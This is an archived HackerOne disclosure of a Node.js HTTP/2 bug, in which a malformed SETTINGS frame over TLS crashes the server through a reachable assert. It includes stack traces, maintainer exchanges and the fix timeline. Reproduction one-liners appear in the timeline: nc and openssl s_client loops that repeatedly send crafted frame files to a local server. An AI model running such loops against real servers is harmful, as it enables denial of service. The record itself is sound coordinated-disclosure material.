---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/uncontrolled-resource-consumption
  - env/web
  - stack/node
substate: "resolved"
weakness: "Uncontrolled Resource Consumption"
enriched: true
date: 2020-07-03
submitted: 2020-02-20T00:15:45.906Z
bounty_usd: 250
votes: 14
cve: []
program: "[[programs/nodejs|Node.js]]"
reporter: "jzebor"
source: "https://hackerone.com/reports/800140"
title: "Malformed HTTP/2 SETTINGS frame leads to reachable assert"
---
# Malformed HTTP/2 SETTINGS frame leads to reachable assert

> **Severity:** Critical | **Bounty:** 250 USD | **Votes:** 14 | **Program:** Node.js | **Disclosed:** 2020-07-03

- Report: [https://hackerone.com/reports/800140](https://hackerone.com/reports/800140)
- CWE: Uncontrolled Resource Consumption
- Submitted: 2020-02-20T00:15:45.906Z

## Timeline

- **Report Filed**
- **2020-02-20** @jzebor: Stack Trace -- 
```
#0  0x00007f6a3c1b7337 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:55
55	  return INLINE_SYSCALL (tgkill, 3, pid, selftid, sig);
#0  0x00007f6a3c1b7337 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:55
#1  0x00007f6a3c1b8a28 in __GI_abort () at abort.c:90
#2  0x0000000000a9d581 in node::Abort() ()
#3  0x0000000000a9d5f7 in node::Assert(node::AssertionInfo const&) ()
#4  0x0000000000ac9c4a in node::http2::Http2Session::MaybeScheduleWrite() ()
#5  0x0000000000acf608 in node::http2::Http2Session::OnStreamRead(long, uv_buf_t const&) ()
#6  0x0000000000bc67bb in node::TLSWrap::ClearOut() ()
#7  0x0000000000bc7c8b in node::TLSWrap::OnStreamRead(long, uv_buf_t const&) ()
#8  0x0000000000b58fd6 in node::LibuvStreamWrap::OnUvRead(long, uv_buf_t const*) ()
#9  0x00000000013d66d9 in uv__read (stream=stream@entry=0x5bb99c0) at ../deps/uv/src/unix/stream.c:1243
#10 0x00000000013d6d00 in uv__stream_io (loop=<optimized out>, w=0x5bb9a48, events=1) at ../deps/uv/src/unix/stream.c:1310
#11 0x00000000013dce58 in uv__io_poll (loop=loop@entry=0x4310c20 <default_loop_struct>, timeout=735) at ../deps/uv/src/unix/linux-core.c:431
#12 0x00000000013cae9b in uv_run (loop=0x4310c20 <default_loop_struct>, mode=UV_RUN_DEFAULT) at ../deps/uv/src/unix/core.c:375
#13 0x0000000000adab83 in node::NodeMainInstance::Run() ()
#14 0x0000000000a6e7b1 in node::Start(int, char**) ()
#15 0x00007f6a3c1a3505 in __libc_start_main (main=0xa09a50 <main>, argc=2, argv=0x7ffd8d25baa8, init=<optimized out>, fini=<optimized out>, 
    rtld_fini=<optimized out>, stack_end=0x7ffd8d25ba98) at ../csu/libc-start.c:266

```
- **2020-02-20** @jzebor: Valgrind Stack Trace and Output -- 
```
../node-debug[28817]: ../src/node_http2.cc:1521:void node::http2::Http2Session::MaybeScheduleWrite(): Assertion `(flags_ & SESSION_STATE_WRITE_SCHEDULED) == (0)' failed.
 1: 0xa07d50 node::Abort() [../node-debug]
 2: 0xa07dce  [../node-debug]
 3: 0xa35612 node::http2::Http2Session::MaybeScheduleWrite() [../node-debug]
 4: 0xa3dd88 node::http2::Http2Session::OnStreamRead(long, uv_buf_t const&) [../node-debug]
 5: 0xb3445b node::TLSWrap::ClearOut() [../node-debug]
 6: 0xb3579b node::TLSWrap::OnStreamRead(long, uv_buf_t const&) [../node-debug]
 7: 0xac5496 node::LibuvStreamWrap::OnUvRead(long, uv_buf_t const*) [../node-debug]
 8: 0x1347689  [../node-debug]
 9: 0x1347cb0  [../node-debug]
10: 0x134de08  [../node-debug]
11: 0x133be6b uv_run [../node-debug]
12: 0xa466cd node::NodeMainInstance::Run() [../node-debug]
13: 0x9d9297 node::Start(int, char**) [../node-debug]
14: 0x5ef1505 __libc_start_main [/lib64/libc.so.6]
15: 0x973d95  [../node-debug]
==28817== 
==28817== Process terminating with default action of signal 6 (SIGABRT): dumping core
==28817==    at 0x5F05337: raise (raise.c:55)
==28817==    by 0x5F06A27: abort (abort.c:90)
==28817==    by 0xA07D60: node::Abort() (in /root/nodejs/nightly/node-v14.0.0-nightly20200213e23b12e130-linux-x64/bin/node)
==28817==    by 0xA07DCD: node::Assert(node::AssertionInfo const&) (in /root/nodejs/nightly/node-v14.0.0-nightly20200213e23b12e130-linux-x64/bin/node)
==28817==    by 0xA35611: node::http2::Http2Session::MaybeScheduleWrite() (in /root/nodejs/nightly/node-v14.0.0-nightly20200213e23b12e130-linux-x64/bin/node)
==28817==    by 0xA3DD87: node::http2::Http2Session::OnStreamRead(long, uv_buf_t const&) (in /root/nodejs/nightly/node-v14.0.0-nightly20200213e23b12e130-linux-x64/bin/node)
==28817==    by 0xB3445A: node::TLSWrap::ClearOut() (in /root/nodejs/nightly/node-v14.0.0-nightly20200213e23b12e130-linux-x64/bin/node)
==28817==    by 0xB3579A: node::TLSWrap::OnStreamRead(long, uv_buf_t const&) (in /root/nodejs/nightly/node-v14.0.0-nightly20200213e23b12e130-linux-x64/bin/node)
==28817==    by 0xAC5495: node::LibuvStreamWrap::OnUvRead(long, uv_buf_t const*) (in /root/nodejs/nightly/node-v14.0.0-nightly20200213e23b12e130-linux-x64/bin/node)
==28817==    by 0x1347688: uv__read (stream.c:1239)
==28817==    by 0x1347CAF: uv__stream_io (stream.c:1306)
==28817==    by 0x134DE07: uv__io_poll (linux-core.c:431)
==28817== 
==28817== HEAP SUMMARY:
==28817==     in use at exit: 5,417,689 bytes in 22,533 blocks
==28817==   total heap usage: 87,196 allocs, 64,663 frees, 53,435,449 bytes allocated
==28817== 
==28817== LEAK SUMMARY:
==28817==    definitely lost: 4,368 bytes in 4 blocks
==28817==    indirectly lost: 736 bytes in 23 blocks
==28817==      possibly lost: 642,280 bytes in 604 blocks
==28817==    still reachable: 4,770,305 bytes in 21,902 blocks
==28817==                       of which reachable via heuristic:
==28817==                         stdstring          : 38,738 bytes in 794 blocks
==28817==                         newarray           : 3,960 bytes in 15 blocks
==28817==                         multipleinheritance: 48 bytes in 1 blocks
==28817==         suppressed: 0 bytes in 0 blocks
==28817== Rerun with --leak-check=full to see details of leaked memory
==28817== 
==28817== For counts of detected and suppressed errors, rerun with: -v
==28817== ERROR SUMMARY: 0 errors from 0 contexts (suppressed: 0 from 0)
Aborted (core dumped)
```
- **2020-02-20** @h1_analyst_caesar: Hi @jzebor,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@turtle_shell
- **Report Needs More Info**
- **Report New**
- **Report Needs More Info**
- **Report New**
- **Report Triaged**
- **2020-02-20** @octetcloud: @jzebor To confirm, doing something like `while true; do cat _1* _2* _3* _4*; done | nc localhost:3000` should be sufficient assuming a node server is doing an HTTP/2 listen on 3000? No connection setup required other than a TCP connect?
- **2020-02-20** @jzebor: I have not tried without TLS. I can attempt with an h2c connection and let you know. Notice the stack trace does include calls to TLS* functions.
- **2020-02-20** @jzebor: In my testing, TLS enabled H2 server appears to be a requirement. I was unable to reproduce the crash with a cleartext H2 server.

Here is the reproduction test case that worked multiple times on my system. Noticed that the crash occured about 500 requests in. I did have one case that required to run two different runs with 500 requests each.

```
for x in {1..10000}; do echo $x; cat 1_connection_preface_frame 2_headers_frame 3_server_settings_ack_frame 4_settings_anomaly | openssl s_client -alpn h2 -connect localhost:8443; done
```
- **2020-02-20** @octetcloud: Thank you, that should help reproduce.
- **2020-02-20** @jzebor: It turns out to be significantly easier to trigger if you just run two instances of the loop above at the same time.
- **2020-02-24** @jzebor: Please provide a status update on this report. Thanks.
- **2020-03-03** @jzebor: Please provide a status update on this report. Thanks.
- **2020-03-03** @h1_analyst_oceana: Hello  @jzebor,

Thanks for your patience! The team is still working on this internally, and you will be updated once there is more information to share.

Regards,

@magicmouse
- **2020-03-30** @jzebor: Please provide a status update on this report. Thanks.
- **2020-04-13** @trott: @jzebor Sorry to say no one has had time to look at this in depth yet, but someone has volunteered to dive in on it and hopefully we'll be able to supply a more meaningful update soon. Thanks for your patience.
- **2020-04-21** @jasnell: I'm working on this code this week for another matter and will look into this as well
- **2020-05-27** @jzebor: Hello, any update on this issue ? I have not seen any indications that actions to fix this issue have been taken.

Thanks.
- **2020-05-28** @octetcloud: Sorry, we don't have the technical mechanisms to give access to the fix to just one person. I wish we could, so that you could see the proposed fixes and coordination required.

I can confirm a fix will be released as part of https://nodejs.org/en/blog/vulnerability/june-2020-security-releases/
- **2020-05-28** @jzebor: OK, I understand. Thanks for the update. I'll watch for the security announcement.
- **2020-05-28** @octetcloud: Subscribe to https://groups.google.com/forum/#!forum/nodejs-sec to get the notification pushed. As you can see from the history, it is very low traffic.
- **2020-06-03** @octetcloud: @jzebor My apologies, our release process is overly complex and manual, and I missed your request "I only ask that Jordan Zebor and Adam Cabrey of F5 Networks be crediting with finding the issue.". I will edit the public blog post to include this.
- **2020-06-03** @octetcloud: https://github.com/nodejs/nodejs.org/pull/3206 in review to credit researchers.
- **Report Resolved**
- **Agreed On Going Public**
- **2020-06-03** @jzebor: Thanks for the information and for giving credit post release. Can you please help me understand these last remaining questions before closing the case out ?

1) I didn't observe the same issue as your characterized for CVE-2020-11080.  I though the issue was a reachable assert which caused the node process to actually stop instead of causing a CPU spike. I never saw "the activity completed", it would simply assert and cause the node process to stop. The way it's worded makes it seem like a transient issue which is not what I observed. Can you please clarify your teams position on this ?

2) Why is the classification on this issue LOW ? A minimal CVSS estimate is medium. The observed impact I saw would make it a high per CVSS score. Help me understand this please. https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
- **2020-06-03** @octetcloud: I was not directly involved in the analysis or fix, just in preparing release materials, so I can't answer those questions.

@jasnell any comment on above?
- **Report Became Public**
- **Bounty Awarded**
- **2020-07-15** @jzebor: I can't take the bug bounty. Unfortunately my employer will not allow me to accept the bounty since I found this issue with tools owned by my company. The only thing I can accept is credit.....
